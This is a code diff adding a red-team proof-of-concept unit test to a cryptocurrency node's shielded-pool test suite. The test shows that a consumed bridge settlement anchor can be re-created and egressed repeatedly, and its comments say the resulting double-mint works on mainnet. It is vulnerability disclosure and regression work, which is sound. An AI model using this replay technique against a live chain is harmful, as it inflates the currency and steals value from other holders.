@@ -3,7 +3,10 @@
 // file COPYING or http://www.opensource.org/licenses/mit-license.php.
 
 #include <random.h>
+#include <shielded/bridge.h>
 #include <shielded/nullifier.h>
+#include <shielded/turnstile.h>
+#include <shielded/v2_proof.h>
 #include <test/util/shielded_account_registry_test_util.h>
 #include <test/util/setup_common.h>
 #include <test/util/shielded_smile_test_util.h>
@@ -851,6 +854,79 @@ BOOST_AUTO_TEST_CASE(shielded_mutation_marker_invalid_payload_forces_recovery_se
     BOOST_CHECK(marker->IsValid());
     BOOST_CHECK(marker->target_tip_hash.IsNull());
     BOOST_CHECK_EQUAL(marker->target_tip_height, -1);
+}
+
+// =====================================================================================
+// POST-123000 double-mint PoC (red-team finding ds#1): settlement-anchor replay.
+//
+// The bridge settlement-anchor set is the ENTIRE anti-replay defense for V2_EGRESS_BATCH
+// (which carries no nullifiers and injects value_balance = -statement.total_amount into the pool).
+// It is a single-use set implemented as erase-on-consume with NO permanent consumed-marker, and the
+// consensus creation guard (validation.cpp:6404-6413 / mempool 3810-3815) is
+// IsShieldedSettlementAnchorValid == ContainsSettlementAnchor, i.e. CURRENT-PRESENCE ONLY. The anchor
+// id is a deterministic digest of the external settlement (BridgeExternalAnchor{domain_id,
+// source_epoch, data_root, verification_root}, bridge.h:116; no monotone nonce / no consumed flag), so
+// the SAME settlement always maps to the SAME id. Therefore: create -> consume(erase + mint N) ->
+// RE-create the identical anchor (accepted, because the set no longer contains it) -> consume again
+// (mint N AGAIN). Repeat to drain the pool. Contrast V2_REBALANCE manifests, which use the PERMANENT
+// HasShieldedNettingManifest "ever-existed" guard -- the settlement anchors lack that. This is gated
+// at nShieldedMatRiCTDisableHeight (61000 mainnet), so it is LIVE after the 123000 C-002 hardening
+// (which only touched the SMILE2 CT serial/balance binding, not the bridge/settlement path).
+BOOST_AUTO_TEST_CASE(settlement_anchor_replay_double_mint_poc)
+{
+    // (1) Replay determinism: the same external settlement re-derives the SAME anchor id.
+    shielded::BridgeExternalAnchor anchor;
+    anchor.version = 1;
+    anchor.domain_id = uint256{0xD0};
+    anchor.source_epoch = 7;
+    anchor.data_root = uint256{0xDA};
+    anchor.verification_root = uint256{0x4E};
+    BOOST_REQUIRE(anchor.IsValid());
+    const uint256 anchor_id  = shielded::v2::proof::ComputeSettlementExternalAnchorDigest(anchor);
+    const uint256 anchor_id2 = shielded::v2::proof::ComputeSettlementExternalAnchorDigest(anchor); // replay
+    BOOST_REQUIRE(!anchor_id.IsNull());
+    BOOST_CHECK_EQUAL(anchor_id, anchor_id2);  // a replayed settlement maps to the identical anchor id
+
+    // (2) Consensus lifecycle on the real persistent set: create -> consume(erase) -> RE-create.
+    NullifierSet ns(m_args.GetDataDirNet() / "test_nf_anchor_replay", 1 << 20,
+                    /*memory_only=*/false, /*wipe_data=*/true);
+
+    // Block height >= 61000 single-use regime is active. Block A: V2_SETTLEMENT_ANCHOR creates it.
+    BOOST_CHECK(!ns.ContainsSettlementAnchor(anchor_id));
+    BOOST_CHECK(ns.InsertSettlementAnchors({ConfirmedSettlementAnchorState{anchor_id, 61010}}));
+    BOOST_CHECK(ns.ContainsSettlementAnchor(anchor_id));   // duplicate-create guard would now fire (good)
+
+    // Block B (after maturity): V2_EGRESS_BATCH consumes it -> mints total_amount into the pool, and
+    // RemoveSettlementAnchors erases the id. There is NO permanent record that it was ever consumed.
+    BOOST_CHECK(ns.RemoveSettlementAnchors({anchor_id}));
+    BOOST_CHECK(!ns.ContainsSettlementAnchor(anchor_id));  // erased; nothing remembers the consume
+
+    // *** THE BUG ***  Block C: re-submit the IDENTICAL external settlement. The consensus creation
+    // guard is only ContainsSettlementAnchor(anchor_id), which is false again -> the re-create is
+    // ACCEPTED. A sound chain MUST reject this as an already-consumed settlement.
+    BOOST_CHECK(ns.InsertSettlementAnchors({ConfirmedSettlementAnchorState{anchor_id, 61020}}));
+    BOOST_CHECK(ns.ContainsSettlementAnchor(anchor_id));   // anchor live again -> Block D egress mints N AGAIN
+
+    // END-TO-END mint through the REAL turnstile: each V2_EGRESS_BATCH consuming the (replayed) anchor
+    // credits the pool by its statement.total_amount = N (egress value_balance = -N, bundle.cpp:1067-1072,
+    // applied by ShieldedPoolBalance::ApplyValueBalance at validation.cpp:1082). We replay the SAME
+    // external settlement and watch the pool inflate by N every cycle.
+    const CAmount N = 50'000 * COIN;  // one real external settlement worth 50k BTX
+    ShieldedPoolBalance pool;
+    BOOST_REQUIRE(pool.SetBalance(0));
+    BOOST_REQUIRE(pool.ApplyValueBalance(-N));  // first (legitimate) egress of the settlement: pool = N
+    CAmount mints = 1;
+    for (int cycle = 0; cycle < 5; ++cycle) {
+        BOOST_CHECK(ns.RemoveSettlementAnchors({anchor_id}));                                            // consume + erase
+        BOOST_CHECK(!ns.ContainsSettlementAnchor(anchor_id));
+        BOOST_CHECK(ns.InsertSettlementAnchors({ConfirmedSettlementAnchorState{anchor_id, 61030 + cycle}})); // REPLAY (re-create)
+        BOOST_CHECK(ns.ContainsSettlementAnchor(anchor_id));
+        BOOST_REQUIRE(pool.ApplyValueBalance(-N));  // egress the replayed anchor again: pool += N
+        ++mints;
+    }
+    // One legitimately-attested external settlement of value N has now been egressed 6 times.
+    BOOST_CHECK_EQUAL(pool.GetBalance(), mints * N);
+    BOOST_CHECK_EQUAL(pool.GetBalance(), 6 * N);  // 300,000 BTX minted from a single real settlement
 }
 
 BOOST_AUTO_TEST_SUITE_END()
